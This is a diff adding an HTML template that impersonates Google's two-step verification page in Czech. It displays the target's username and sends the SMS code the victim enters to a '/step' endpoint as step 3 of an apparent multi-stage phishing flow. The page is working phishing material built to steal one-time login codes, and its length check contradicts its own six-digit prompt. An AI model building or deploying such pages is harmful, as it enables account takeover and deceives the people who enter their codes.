@@ -1,0 +1,70 @@
+<html>
+  <head>
+    <title>Google</title>
+    <link rel=icon href="https://www.google.com/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="/static/styles/google.css">
+    <style>
+      {{ adictional_style | safe }}
+    </style>
+    <script>
+      function input_in(){
+        var btn = document.getElementById("placeholder");
+        btn.style.display = "none";
+        var box = document.getElementById("box_input");
+        box.style.border =  "2px solid #1a73e8";
+      }
+      </script>
+      <script>
+      function input_out(){
+        var btn = document.getElementById("placeholder");
+        btn.style.display = "none";
+        var box = document.getElementById("box_input");
+        box.style.border =  "1px solid #dadce0";
+      }
+      </script>
+      <script>
+      function next() {
+        var username = document.getElementById("input_code").value;
+        if (username.length < 8) {
+          document.getElementById("input_code").value = "";
+          var box = document.getElementById("box_input");
+          box.style.border =  "1px solid #db0d29";
+          console.log("first_if");
+        } else {
+          document.getElementById("loading").style.display = "block";
+          document.getElementById("box_input-form").submit();
+          console.log("second_if");
+          document.getElementById("next_button").onclick = null;
+        }
+        console.log("none");
+      }
+    </script>
+  </head>
+  <body>
+    <div class="box_main">
+      <div style="display: none;" id="loading" class="loading">
+        <div></div>
+      </div>
+      <img src="/static/img/download.png">
+      <h2>Dvoufázové ověření</h2>
+      <h2 style="font-size: 14px; text-align: left;">Tento další krok potvrdí, že se skutečně přihlašujete vy</h2>
+      <div class="user_info">
+        <img src="/static/img/user_profile_logo.jpg">
+        <div>{{username}}</div>
+      </div>
+      <h2 style="font-size: 14px; text-align: left;">Dvoufázové ověření</h2>
+      <h2 style="font-size: 12px; text-align: left;">Textová zpráva s šestimístným ověřovacím kódem byla odeslána na vaše číslo</h2>
+      <div id="box_input" class="box_input">
+        <form id="box_input-form" style="margin: 0; width: 100%;" method="POST" action="/step">
+          <input id="input_code" type="text" name="code" onclick="input_in()" onblur="input_out()"></input>
+          <input type="hidden" name="step_number" value="3">
+        </form>
+        <div id="placeholder">Zadejte kód</div>
+      </div>
+      <div class="buttons">
+        <a>Vyzkoušet jiný způsob</a>
+        <div id="next_button" onclick="next();"><p>Další</p></div>
+      </div>
+    </div>
+  </body>
+</html>
